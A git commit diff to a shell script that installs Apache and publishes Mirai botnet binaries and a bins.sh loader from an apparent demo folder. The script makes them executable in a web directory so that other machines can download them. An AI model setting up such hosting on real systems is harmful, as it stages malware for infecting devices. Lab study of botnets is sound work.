5b72c20df3f72e5a17e36898f5ef4b974a491654
Nils <nilshannappel@gmx.de>
2025-03-25 12:26:27 +0100

    working shell script for apache server

--- install_apache_web_server.sh
+++ install_apache_web_server.sh
@@ -1,20 +1,23 @@
-if ! command -v apache2 &> /dev/null
-then
-    echo "Insatlling Apache2"
+if ! dpkg -l | grep -q apache2; then
+    echo "Apache2 is not installed. Installing now..."
     sudo apt-get update
     sudo apt-get install apache2 -y
 else
-    echo "Apache2 is installed"
+    echo "Apache2 is installed."
 fi
 
 
-
 cd ReadMine-Mirai-Demo-Files/release
-mkdir /var/www/html/bins
-cp mirai.* /var/www/html/bins
-cp bins.sh /var/www/html/bins
-rm /var/www/html/index.html
+sudo mkdir -p /var/www/html/bins
+sudo cp mirai.* /var/www/html/bins
+sudo cp bins.sh /var/www/html/bins
 
+#very important, for 'others' the files must be executable in order to download them
+sudo chmod 755 /var/www/html/bins/*
+
+if [ -f /var/www/html/index.html ]; then
+    sudo rm /var/www/html/index.html
+fi
 sudo service apache2 start
 
 echo "Done"
